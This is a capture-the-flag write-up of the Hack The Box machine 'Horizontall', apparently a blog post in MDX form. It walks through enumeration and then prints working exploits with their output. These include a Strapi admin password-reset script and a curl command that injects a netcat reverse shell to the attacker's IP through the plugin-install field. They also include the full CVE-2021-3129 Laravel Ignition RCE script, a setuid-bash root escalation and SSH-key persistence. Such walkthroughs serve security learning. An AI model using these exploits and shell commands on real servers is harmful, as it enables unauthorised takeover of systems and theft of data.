@@ -1,0 +1,560 @@
+---
+title: Hackthebox Horizontall Writeup
+slug: hackthebox-horizontall-writeup
+description: Hackthebox release new machine called Horizontall, in this machine we need to abuse the forgot password functionality to reset the admin password after login inside admin panel we got the vernable version of strapi and exploit that to get rev shell back. inside the machine i found hidden service running laravel vernable version exploit that to get root shell.
+date: 2021-08-31
+image: hackthebox-horizontall-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Horizontall]
+└──╼ [★]$ nmap -sC -sV -oA nmap/result 10.10.11.105
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-28 23:59 CDT
+Nmap scan report for 10.10.11.105
+Host is up (0.087s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
+|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
+|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://horizontall.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
+```
+
+There are two ports open `22:ssh,80:http`
+
+## Port-80
+
+When we go to the `ip` it will redirected to horizontall.htb
+
+<FixTheImageURL src='web.png' slug='hackthebox-horizontall-writeup' />
+
+Let's quickly add that in out `/etc/hosts` file.
+
+```js
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Horizontall]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       parrot
+
+#custom
+10.10.11.105    horizontall.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Now let's check what's `running` on the port `80`.
+
+It's a `simple` web page.
+
+<FixTheImageURL src='web1.png' slug='hackthebox-horizontall-writeup' />
+
+There is a `contact` form let's try to `submit` that.
+
+But i don't `think` so they will send my `req` anywhere.
+
+<FixTheImageURL src='web2.png' slug='hackthebox-horizontall-writeup' />
+
+I use `gobuster` to find some interesting `directories` but there is nothing `interesting`.
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-horizontall-writeup' />
+
+Now the `last` thing is to find `subdomain` i use `gobuster` for that you can use **ffuf** or **wfuzz** for that.
+
+```js
+gobuster vhost -u http://horizontall.htb/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
+```
+
+<FixTheImageURL src='cmd1.png' slug='hackthebox-horizontall-writeup' />
+
+And we found a new `subdomain` called `api-prod.horizontall.htb` let's quickly add this in our `/etc/hosts` file.
+
+```js
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Horizontall]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       parrot
+
+#custom
+10.10.11.105    horizontall.htb api-prod.horizontall.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Now when we go to the `web` page it's said welcome and nothing `interesting` in the page so let's try to find `interesting` directories with `gobuster`.
+
+<FixTheImageURL src='web3.png' slug='hackthebox-horizontall-writeup' />
+
+And we find the `interesting` directory called `/admin`.
+
+```js
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Horizontall]
+└──╼ [★]$ gobuster dir -u http://api-prod.horizontall.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80
+```
+
+<FixTheImageURL src='cmd2.png' slug='hackthebox-horizontall-writeup' />
+
+And we got `strapi` login page. let's check the `exploit` for that.
+
+<FixTheImageURL src='web4.png' slug='hackthebox-horizontall-writeup' />
+
+Link : https://thatsn0tmysite.wordpress.com/2019/11/15/x05/
+
+The `article` is all about how to change any `user` password.
+
+After reading the `article` let's try to `execute` this.
+
+Let's first try with `simple` command to check the `version` of strapi.
+
+```js
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Horizontall]
+└──╼ [★]$ curl http://api-prod.horizontall.htb/admin/strapiVersion
+{"strapiVersion":"3.0.0-beta.17.4"}
+```
+
+It's `works` now let's try to change the `password` of user but we don't known any `user` so let's first `enumerate` that.
+
+In the `admin` login page we find a `forgot` password. let's check if we use this `functionality` to enumerate users.
+
+<FixTheImageURL src='web5.png' slug='hackthebox-horizontall-writeup' />
+
+And we see we can `enumerate` usernames.
+
+<FixTheImageURL src='web6.png' slug='hackthebox-horizontall-writeup' />
+
+Let's check the `admin` user because in every `login` page admin is always first `user`.
+
+<FixTheImageURL src='burp.png' slug='hackthebox-horizontall-writeup' />
+
+And we see when we use `admin` the page taking long to `responce` back.
+
+<FixTheImageURL src='burp1.png' slug='hackthebox-horizontall-writeup' />
+
+So let's try to `reset` the password of `admin` with that `python` script in the `article`.
+
+```js
+import requests
+import sys
+import json
+
+args=sys.argv
+
+if len(args) &lt; 4:
+    print("Usage: {} &lt;admin_email> &lt;url> &lt;new_password>".format(args[0]))
+    exit(-1)
+
+email = args[1]
+url = args[2]
+new_password =  args[3]
+
+s  =  requests.Session()
+
+version = json.loads(s.get("{}/admin/strapiVersion".format(url)).text)
+
+print("[*] Detected version(GET /admin/strapiVersion): {}".format(version["strapiVersion"]))
+
+#Request password reset
+print("[*] Sending password reset request...")
+reset_request={"email":email, "url":"{}/admin/plugins/users-permissions/auth/reset-password".format(url)}
+s.post("{}/".format(url), json=reset_request)
+
+#Reset password to
+print("[*] Setting new password...")
+exploit={"code":{}, "password":new_password, "passwordConfirmation":new_password}
+r=s.post("{}/admin/auth/reset-password".format(url), json=exploit)
+
+print("[*] Response:")
+print(str(r.content))
+```
+
+Now let's run the `script` and reset the `admin` password.
+
+```js
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Horizontall]
+└──╼ [★]$ python3 change_admin_password.py
+Usage: change_admin_password.py &lt;admin_email> &lt;url> &lt;new_password>
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Horizontall]
+└──╼ [★]$ python3 change_admin_password.py admin@horizontall.htb http://api-prod.horizontall.htb Password123
+[*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4
+[*] Sending password reset request...
+[*] Setting new password...
+[*] Response:
+b'{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMjIzMTI1LCJleHAiOjE2MzI4MTUxMjV9.BJLJs3IcjWgL-7n2H1_GikE_QND7-9U28owQq0eayOY","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}'
+```
+
+<FixTheImageURL src='cmd3.png' slug='hackthebox-horizontall-writeup' />
+
+Now let's try to login with `admin`.
+
+<FixTheImageURL src='web7.png' slug='hackthebox-horizontall-writeup' />
+
+And we are inside the `admin` panel.
+
+<FixTheImageURL src='web8.png' slug='hackthebox-horizontall-writeup' />
+
+When i find the `exploit` for strapi login page i also find one more `interesting` article that teach us how to get `rce` but the problem is we need `jwt` token for that but now we are `login` we have the jwt token now let's `try` that now.
+
+Link : https://bittherapy.net/post/strapi-framework-remote-code-execution/
+
+Let me tell you where you get the `jwt` token.
+
+Just `refresh` the page and capture the `req` in burp and you got the `jwt` token.
+
+<FixTheImageURL src='burp2.png' slug='hackthebox-horizontall-writeup' />
+
+Now we have `everything` ready let's try that to get `rev` shell.
+
+In the `command` you just need to change the `ip_addr` of tun0 and `jwt` token and you good to go.
+
+```js
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Horizontall]
+└──╼ [★]$ curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer JWT' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Content-Length: 123' -H $'Connection: close' --data $'{"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.59 9001 >/tmp/f)","port":"1337"}' $'http://api-prod.horizontall.htb/admin/plugins/install' --proxy http://127.0.0.1:8080
+```
+
+There is `some` error in the command so we use `--proxy` for that to capture the `req` in the burp and `solve` that error.
+
+Before `running` command run the `netcat` listner on port `9001`.
+
+```js
+nc -nvlp 9001
+```
+
+Now let's run the `command` and capture the `req` in the burp.
+
+<FixTheImageURL src='cmd4.png' slug='hackthebox-horizontall-writeup' />
+
+And we see in the `burp` we need to fix that `json`.
+
+### From This:
+
+<FixTheImageURL src='burp3.png' slug='hackthebox-horizontall-writeup' />
+
+### To This:
+
+And then send the `req` and check the `netcat` listner.
+
+<FixTheImageURL src='burp4.png' slug='hackthebox-horizontall-writeup' />
+
+And we get the `shell`.
+
+<FixTheImageURL src='cmd5.png' slug='hackthebox-horizontall-writeup' />
+
+First let's `stabilized` the shell.
+
+<FixTheImageURL src='cmd6.png' slug='hackthebox-horizontall-writeup' />
+
+And we get the `user.txt`
+
+<FixTheImageURL src='cmd7.png' slug='hackthebox-horizontall-writeup' />
+
+## Privilege escalation
+
+Let's start with `LinPEAS`.
+
+<FixTheImageURL src='cmd8.png' slug='hackthebox-horizontall-writeup' />
+
+After `analyzing` the output i found interesting port `8000` which run locally in the system.
+
+<FixTheImageURL src='cmd9.png' slug='hackthebox-horizontall-writeup' />
+
+I use `chisel` for portforward `8000` port so we can `access` that in our browser.
+
+First let's transfer the `chisel` binary.
+
+<FixTheImageURL src='cmd10.png' slug='hackthebox-horizontall-writeup' />
+
+Now Let's `portforward` the 8000 port.
+
+```js
+./chisel server -p 8001 --reverse       #on local machiene
+./chisel client 10.10.14.59:8001 R:8000:127.0.0.1:8000     # on target machiene
+```
+
+<FixTheImageURL src='cmd11.png' slug='hackthebox-horizontall-writeup' />
+
+Now let's `check` what service is running on `port` 8000.
+
+And we see it's running `laravel php framework`.
+
+<FixTheImageURL src='web9.png' slug='hackthebox-horizontall-writeup' />
+
+Let's `check` the view page `source` and we get the `laravel` version.
+
+<FixTheImageURL src='web10.png' slug='hackthebox-horizontall-writeup' />
+
+Let's search the `exploit` for this specific `version` of laravel.
+
+<FixTheImageURL src='web11.png' slug='hackthebox-horizontall-writeup' />
+
+After some `google` search i found some `reading` materials and `exploit` for that.
+
+Link : https://www.ambionics.io/blog/laravel-debug-rce
+
+Link : https://www.youtube.com/watch?v=gr8ZKQpYiug
+
+Link : https://github.com/nth347/CVE-2021-3129_exploit
+
+### CVE-2021-3129_Exploit
+
+```js
+#!/usr/bin/env python3
+import requests
+import subprocess
+import re
+import os
+import sys
+
+
+# Send a post request with a specific viewFile value, returning HTTP response
+def send(url='', viewfile=''):
+    headers = {
+        "Accept": "application/json"
+    }
+    data = {
+        "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
+        "parameters": {
+            "variableName": "whateverYouWant",
+            "viewFile": ""
+        }
+    }
+    data['parameters']['viewFile'] = viewfile
+    resp = requests.post(url, json=data, headers=headers, verify=False)
+    return resp
+
+
+# Generate payload and return it as text
+def generate(chain='', command=''):
+    # Ensure that we have PHPGGC in current directory, if not we'll clone it
+    if os.path.exists("phpggc"):
+        print("[+] PHPGGC found. Generating payload and deploy it to the target")
+    else:
+        print("[i] PHPGGC not found. Cloning it")
+        os.system("git clone https://github.com/ambionics/phpggc.git")
+    payload = subprocess.getoutput(
+        r"php -d'phar.readonly=0' ./phpggc/phpggc '%s' system '%s' --phar phar -o php://output | base64 -w0 | "
+        r"sed -E 's/./\0=00/g; s/==/=3D=/g; s/$/=00/g'" % (chain, command))
+    return payload
+
+
+# Clear logs,
+def clear(url):
+    print("[i] Trying to clear logs")
+    while (send(url,
+                "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf"
+                "-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log").status_code != 200):
+        continue
+    print("[+] Logs cleared")
+
+
+if __name__ == '__main__':
+    if len(sys.argv) &lt; 4:
+        print("Usage:   %s &lt;URL> &lt;CHAIN> &lt;CMD>" % sys.argv[0])
+        print("Example: %s http(s)://localhost:8000 Monolog/RCE1 whoami" % sys.argv[0])
+        print("I recommend to use Monolog/RCE1 or Monolog/RCE2 as CHAIN")
+        exit(1)
+    url = sys.argv[1] + "/_ignition/execute-solution"
+    chain = sys.argv[2]
+    command = sys.argv[3]
+
+    # Step 1. Clear logs, write the first log entry
+    clear(url)
+    send(url, "AA")
+
+    # Step 3. Write the second log entry with encoded PHAR payload
+    send(url, generate(chain, command))
+
+    # Step 4. Convert log file to a valid PHAR
+    if (send(url,
+                "php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64"
+                "-decode/resource=../storage/logs/laravel.log").status_code == 200):
+        print("[+] Successfully converted logs to PHAR")
+    else:
+        print("[-] Fail to convert logs to PHAR")
+
+    # Step 5. Trigger PHAR deserialization, extract the output
+    response = send(url, "phar://../storage/logs/laravel.log")
+    result = re.sub("{[\s\S]*}", "", response.text)
+    if result:
+        print("[+] PHAR deserialized. Exploited\n")
+        print(result)
+    else:
+        print("[i] There is no output")
+
+    # Clear logs
+    clear(url)
+```
+
+Now let's try to run the `exploit` with simple command `id`.
+
+```js
+┌───[us-free-1]─[10.10.14.40]─[root@parrot]─[~/Desktop/HTB/Horizontall]
+└──╼ [★]$ vim exploit.py
+┌───[us-free-1]─[10.10.14.40]─[root@parrot]─[~/Desktop/HTB/Horizontall]
+└──╼ [★]$ chmod +x exploit.py
+┌───[us-free-1]─[10.10.14.40]─[root@parrot]─[~/Desktop/HTB/Horizontall]
+└──╼ [★]$ python3 exploit.py http://localhost:8000 Monolog/RCE1 id
+[i] Trying to clear logs
+[+] Logs cleared
+[+] PHPGGC found. Generating payload and deploy it to the target
+[+] Successfully converted logs to PHAR
+[+] PHAR deserialized. Exploited
+
+uid=0(root) gid=0(root) groups=0(root)
+
+[i] Trying to clear logs
+[+] Logs cleared
+```
+
+<FixTheImageURL src='cmd12.png' slug='hackthebox-horizontall-writeup' />
+
+And the output is `root` so let's try our old `trick` to get `root` shell you guys known that😉
+
+```js
+┌───[us-free-1]─[10.10.14.40]─[root@parrot]─[~/Desktop/HTB/Horizontall]
+└──╼ [★]$ python3 exploit.py http://localhost:8000 Monolog/RCE1 'chmod +s /bin/bash;echo done'
+[i] Trying to clear logs
+[+] Logs cleared
+[+] PHPGGC found. Generating payload and deploy it to the target
+[+] Successfully converted logs to PHAR
+[+] PHAR deserialized. Exploited
+
+done
+
+[i] Trying to clear logs
+[+] Logs cleared
+```
+
+<FixTheImageURL src='cmd13.png' slug='hackthebox-horizontall-writeup' />
+
+Now go to your `previous` shell of strapi user and `execute` the suit bit set `binary(/bin/bash)` and get the `root.txt`
+
+```js
+strapi@horizontall:/tmp$ ls -al /bin/bash
+-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
+strapi@horizontall:/tmp$ /bin/bash -p
+bash-4.4# cd /root
+bash-4.4# ls
+boot.sh  pid  restart.sh  root.txt
+bash-4.4# cat root.txt
+d81660812e51818997acccae1f11ef9b
+```
+
+<FixTheImageURL src='cmd14.png' slug='hackthebox-horizontall-writeup' />
+
+## Second Method Through Ssh
+
+This `second` method is for those who geeting `error` in `chisel` portforwarding.
+
+So first create your `ssh` keys.
+
+```js
+┌───[us-free-1]─[10.10.14.40]─[root@parrot]─[~/.ssh]
+└──╼ [★]$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa):
+/root/.ssh/id_rsa already exists.
+Overwrite (y/n)? y
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /root/.ssh/id_rsa
+Your public key has been saved in /root/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:ZgXqDQQxVV3ryWvsxSLV8gvgjpYfL7EO+nqC8cemwJM root@parrot
+The key's randomart image is:
++---[RSA 3072]----+
+|    ++o.o. ..    |
+|     o . ..  .   |
+|      o   . .    |
+|     . o . o o   |
+|      . S . * .  |
+|   ... o ..+ =   |
+|    E+ ...+o* +  |
+|    .oo.B+o* + . |
+|      +Xoo+.o .  |
++----[SHA256]-----+
+┌───[us-free-1]─[10.10.14.40]─[root@parrot]─[~/.ssh]
+└──╼ [★]$ ls
+id_rsa  id_rsa.pub  known_hosts
+┌───[us-free-1]─[10.10.14.40]─[root@parrot]─[~/.ssh]
+└──╼ [★]$ cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9gSPz8b9CqtPfEiadGMQtaFY6hcOCAdKZ0zutIfLSGFO/OQW63U6ynkjMo/J83VZPYLxFPTMJrHFypvfeB85TQQwXKWNwLBooRLLCFs686dzGXN5ofuGFPqtS8mNoRUFJSUcwHo4ZLVFXkcQSQ3j6PI4sE57eWadkodTZBYmDlemhZPROMwi8RvuCoaeYxS2zeuf+ghIsvpseSBxIPn1B98Y8QtuBidyXcyyAs6aKFh3Vg451M7W+wHCOlYRY7F8Zbiok2dkkQJS5ce0fAObv8XdjriEdaaFNjO+xNOSy/KQzYYoQDbl+ZEP9wlRtpJ6K8LyQXrhVJwhTQjpYw4HjDAb/xdY+jFBvTqUy2oeUsnLGHaBo0fng/fGD8vH/4JA2C8mIHs2LDfUrrG9jda1uh+LF7rJyh1vV67s1djIR3tgjvUR0S5wYbJn+ZIsDhvcxan7N1myg9c87hyJiW/bjB5Mj8= root@parrot
+```
+
+After that go to the `strapi` user shell and `create` a directory called `.ssh` inside strapi user home folder then paste your `ssh` public keys inside `.ssh` folder with name `authorized_keys`.
+
+```js
+strapi@horizontall:~$ cd ~
+strapi@horizontall:~$ ls -al
+total 60
+drwxr-xr-x 10 strapi strapi 4096 Aug 31 03:53 .
+drwxr-xr-x  3 root   root   4096 May 26 14:24 ..
+-rw-------  1 root   root     30 Aug 31 03:53 .bash_history
+-rw-r--r--  1 strapi strapi  231 Jun  1 12:50 .bash_logout
+-rw-r--r--  1 strapi strapi 3810 Jun  1 12:49 .bashrc
+drwx------  2 strapi strapi 4096 May 26 14:29 .cache
+drwx------  3 strapi strapi 4096 May 26 14:30 .config
+drwx------  3 strapi strapi 4096 May 26 14:29 .gnupg
+drwxrwxr-x  3 strapi strapi 4096 Jun  1 12:07 .local
+drwxr-xr-x  9 strapi strapi 4096 Jul 29 04:29 myapi
+drwxrwxr-x  5 strapi strapi 4096 Aug 31 03:54 .npm
+-rwxrwxr-x  1 strapi strapi   51 Aug 31 03:47 phpggc
+drwxrwxr-x  5 strapi strapi 4096 Aug 31 00:20 .pm2
+-rw-r--r--  1 strapi strapi  807 Apr  4  2018 .profile
+drwx------  2 strapi strapi 4096 Aug 31 03:44 .ssh
+strapi@horizontall:~$ cd .ssh/
+strapi@horizontall:~/.ssh$ ls
+authorized_keys
+strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9gSPz8b9CqtPfEiadGMQtaFY6hcOCAdKZ0zutIfLSGFO/OQW63U6ynkjMo/J83VZPYLxFPTMJrHFypvfeB85TQQwXKWNwLBooRLLCFs686dzGXN5ofuGFPqtS8mNoRUFJSUcwHo4ZLVFXkcQSQ3j6PI4sE57eWadkodTZBYmDlemhZPROMwi8RvuCoaeYxS2zeuf+ghIsvpseSBxIPn1B98Y8QtuBidyXcyyAs6aKFh3Vg451M7WI8Uj0GcsrgodFCiYxWIkNpdP7zoGoswD2UTOnW+wHCOlYRY7F8Zbiok2dkkQJS5ce0fAObv8XdjriEdaaFNjO+xNOSy/KQzYYoQDbl+ZEP9wlRtpJ6K8LyQXrhVJwhTQjpYw4HjDAb/xdY+jFBvTqUy2oeUsnLGHaBo0fng/fGD8vH/4JA2C8mIHs2LDfUrrG9jda1uh+LF7rJyh1vV67s1djIR3tgjvUR0S5wYbJn+ZIsDhvcxan7N1myg9c87hyJiW/bjB5Mj8= root@parrot" > authorized_keys
+strapi@horizontall:~/.ssh$
+```
+
+<FixTheImageURL src='cmd15.png' slug='hackthebox-horizontall-writeup' />
+
+Now you can `forward` the port `8000` with help of `ssh`.
+
+```js
+┌───[us-free-1]─[10.10.14.40]─[root@parrot]─[~/.ssh]
+└──╼ [★]$ chmod 600 id_rsa
+┌───[us-free-1]─[10.10.14.40]─[root@parrot]─[~/.ssh]
+└──╼ [★]$ ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@10.10.11.105
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Aug 31 04:03:40 UTC 2021
+
+  System load:  0.07              Processes:           203
+  Usage of /:   82.6% of 4.85GB   Users logged in:     1
+  Memory usage: 30%               IP address for eth0: 10.10.11.105
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Aug 31 03:55:47 2021 from 10.10.14.122
+$
+```
